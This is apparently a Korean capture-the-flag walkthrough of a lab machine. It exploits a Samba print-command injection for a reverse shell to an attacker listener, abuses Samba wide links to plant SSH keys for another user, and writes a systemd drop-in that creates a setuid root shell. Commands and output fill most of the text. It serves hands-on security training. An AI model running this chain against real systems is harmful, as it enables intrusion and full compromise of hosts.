## Inital Acccess - rclone

[TheCyberGeek Github](https://github.com/TheCyberGeek/CVE-2026-4480-PoC)

`Reception printer`를 통해 서칭을 진행하면 `CVE-2026-4480`을 알 수 있다.

`CVE-2026-4480`은 `Samba print command`의 `%J(Job Name)` 쉘 인젝션으로 Samba가 프린트 작업 완료 시 `print command`를 `system()`으로 실행하면서 `%J`를 그대로 삽입한다.

이를 악용하여 Job Name에 임의 명령어를 작성해 원격 코드 실행이 가능하다.

```zsh
└─$ python3 exploit.py 10.129.18.36 10.10.16.17 80
[*] target   : 10.129.18.36 (\\10.129.18.36\HP-Reception)
[*] callback : 10.10.16.17:80  (start a listener first: nc -lvnp 80)
[+] print job submitted -- check your listener / out-of-band channel
```

```zsh
└─$ rlwrap -cAr nc -nlvp 80
listening on [any] 80 ...
connect to [10.10.16.17] from (UNKNOWN) [10.129.18.36] 54800

nobody@abducted:/var/spool/samba$ 
```

리스너를 켜두고 PoC를 실행하면 다음과 같이 `nobody`유저의 리버스 쉘을 수신할 수 있다.

## Privilege Escalation - Systemd drop-in

```zsh
scott@abducted:~$ cat /etc/cron.d/offsite-backup
30 2 * * * root /opt/offsite-backup/sync.sh >/dev/null 2>&1

scott@abducted:~$ cat /opt/offsite-backup/sync.sh
#!/bin/bash
/usr/bin/rclone --config /opt/offsite-backup/rclone.conf sync /srv/projects offsite:projects
```

`/opt/offsite-backup/sync.sh`파일은 `Crontab`으로 적용되어 있지만 주기가 매일 새벽 2시 30분에 실행된다.

`/srv/projects/`경로에 대해 `scott`유저는 쓰기 작업이 가능하지만, 위 스크립트에 `/srv/projects`경로의 파일을 `offsite:projects`와 동기화하므로 권한 상승에 사용하기 힘들거라 판단했다.

```zsh
scott@abducted:~$ cat /etc/samba/shares.conf
[HP-Reception]
   comment = Reception printer
   path = /var/spool/samba
   printable = yes
   guest ok = yes
   print command = /usr/local/bin/printaudit %J %s
   lpq command = /bin/true
   lprm command = /bin/true

[projects]
   comment = Hartley Group Project Files
   path = /srv/projects
   valid users = scott
   read only = no
   browseable = yes

[transfer]
   comment = Staff file transfer
   path = /srv/transfer
   valid users = scott
   force user = marcus
   read only = no
   wide links = yes
   browseable = yes
```

Samba의 공유 설정을 확인해보면 `transfer`에 대해 `force user`가 `marcus`로 설정되어 있으며 `wide links`가 `yes`로 설정되어 있다.

```zsh
scott@abducted:~$ cat /etc/samba/smb.conf
[global]
   workgroup = WORKGROUP
   server string = Hartley Group Document Services
   netbios name = ABDUCTED
   map to guest = Bad User
   guest account = nobody
   security = user
   printing = sysv
   load printers = no
   disable spoolss = no
   unix extensions = no
   allow insecure wide links = yes
   log level = 0
   include = /etc/samba/shares.conf
```

Samba의 설정 파일을 확인해보면 `allow insecure wide links`가 `yes`로 설정되어 있으며, `unix extensions`이 `no`로 되어있다.

두 설정 파일을 바탕으로 정리하면 다음과 같다.:

1. `force user` 옵션으로 인해 `transfer`경로에 파일을 쓰면 `scott`가 인증해도 파일 소유자는 `marcus`가 된다.
2. `wide links`가 `yes`로 되어있어 Samba가 공유 디렉토리 밖을 가리키는 `Symlink`를 따라간다.
3. `wide links`는 `unix extensions`이 켜져있으면 자동으로 비활성화되지만, `global`설정의 두 옵션으로 인해 우회된다.

위 정리를 이용하여 `/src/transfer/[임의경로]`에 `Symlink`를 설정해 `/home/marcus`를 가리키게 하고, Samba가 이를 따라가 `marcus`의 권한으로 `/home/marcus/.ssh/authorized_keys`에 파일을 작성하게 하여 해당 유저로 접근할 수 있다.

```zsh
scott@abducted:/srv/transfer$ ln -s /home/marcus /srv/transfer/marcus

scott@abducted:/srv/transfer$ ssh-keygen -q -t ed25519 -N '' -f /tmp/evil
```

먼저 `/home/marcus`경로를 `/srv/transfer/marcus`에 `Symlink`를 설정하고 `/tmp/evil`에 키를 생성한다.

```zsh
scott@abducted:/srv/transfer$ smbclient //127.0.0.1/transfer -U 'scott%[REDACTED]' -c 'mkdir marcus/.ssh; put /tmp/evil.pub marcus/.ssh/authorized_keys'
putting file /tmp/evil.pub as \marcus\.ssh\authorized_keys (46.9 kb/s) (average 46.9 kb/s)
```

대상 호스트에서 `smbclient`를 사용해서 `scott` 크리덴셜을 통해 생성된 `evil.pub`을 `marcus/.ssh/authorized_keys`에 저장한다.

```zsh
scott@abducted:/srv/transfer$ ssh -i /tmp/evil marcus@localhost
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-124-generic x86_64)

marcus@abducted:~$
```

위 과정이 모두 완료되면 `/tmp/evil`키를 이용해 ssh로 `marcus`유저에 접근할 수 있다.

```zsh
marcus@abducted:~$ id
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
```

`marcus`유저는 `operators`그룹에 속해있다.

```zsh
marcus@abducted:~$ find / -type d -writable 2>/dev/null

[ . . . ]

/etc/systemd/system/smbd.service.d

[ . . . ]

marcus@abducted:~$ ls -alh /etc/systemd/system/smbd.service.d
total 8.0K
drwxrws---  2 root operators 4.0K Jun  4 13:41 .
drwxr-xr-x 26 root root      4.0K Jun  4 13:41 ..
```

쓰기 가능한 디렉토리를 탐색했을 때, `/etc/systemd/system/smbd.service.d`경로에 쓰기가 가능하며, 확인했을 때 `operators`그룹에 속한 유저는 해당 경로에 쓰기가 가능하다.

`systemd`는 해당 디렉토리의 `*.conf`파일을 `smbd.service`에 자동으로 병합한다. `.conf`파일 내부에서 `ExecStartPre=`옵션은 서비스 시작 전에 `root`권한으로 실행된다.

```zsh
marcus@abducted:~$ cat > /etc/systemd/system/smbd.service.d/evil.conf <<'EOF'
[Service]
ExecStartPre=/bin/cp /bin/bash /tmp/chunsik
ExecStartPre=/bin/chmod 4755 /tmp/chunsik
EOF

marcus@abducted:~$ ls -alh /etc/systemd/system/smbd.service.d
total 12K
drwxrws---  2 root   operators 4.0K Jun  8 10:02 .
drwxr-xr-x 26 root   root      4.0K Jun  4 13:41 ..
-rw-rw-r--  1 marcus operators   88 Jun  8 10:02 evil.conf
```

`evil.conf`임의 파일에 `ExecStartPre=`옵션을 사용하여 악성 스크립트 파일을 작성한다.

이후 서비스를 재시작하면 `evil.conf`파일 내용이 `root`권한으로 실행되지만, 일반적으로 서비스 재시작 권한은 `root`만 가능하다.

```zsh
marcus@abducted:~$ for action in $(pkaction); do
    pkcheck --action-id "$action" --process $$ 2>/dev/null && echo "ALLOWED: $action"
done

ALLOWED: org.freedesktop.login1.inhibit-block-idle
ALLOWED: org.freedesktop.login1.inhibit-delay-shutdown
ALLOWED: org.freedesktop.login1.inhibit-delay-sleep
ALLOWED: org.freedesktop.login1.set-self-linger
ALLOWED: org.freedesktop.systemd1.reload-daemon
```

`polkit`의 허용 권한을 확인했을 때 `reload-daemon`은 가능하지만 서비스를 시작하거나 중지하는 권한은 보이지 않는다.

```zsh
marcus@abducted:~$ ls -alh /etc/polkit-1/rules.d
ls: cannot open directory '/etc/polkit-1/rules.d': Permission denied
```

Polkit의 사용자 정의 규칙을 확인해보려 했으나 권한이 없다. 따라서 재시작을 시도해 해당 유저가 권한이 있는지 확인한다.

```zsh
marcus@abducted:~$ systemctl daemon-reload
marcus@abducted:~$ systemctl restart smbd
marcus@abducted:~$ ls -alh /tmp
total 1.5M
drwxrwxrwt 15 root  root  4.0K Jun  8 10:09 .
drwxr-xr-x 23 root  root  4.0K Jun  4 13:41 ..
-rwsr-xr-x  1 root  root  1.4M Jun  8 10:09 chunsik
```

먼저 권한 확인을 했던 `daemon-reload`로 `evil.conf`를 `systemd`가 인식하도록 한다.

이후 `smbd`서비스를 재시작하려고 시도하면 문제 없이 재시작이 되고, 아까 작성했던 `evil.conf`가 트리거되어 `tmp`경로에 파일이 생성된다.

```zsh
marcus@abducted:~$ /tmp/chunsik -p
chunsik-5.2# whoami
root
chunsik-5.2# cat /root/root.txt
[REDACTED]
```

생성된 파일을 실행하여 `root`에 접근할 수 있고 루트 플래그를 획득할 수 있다.
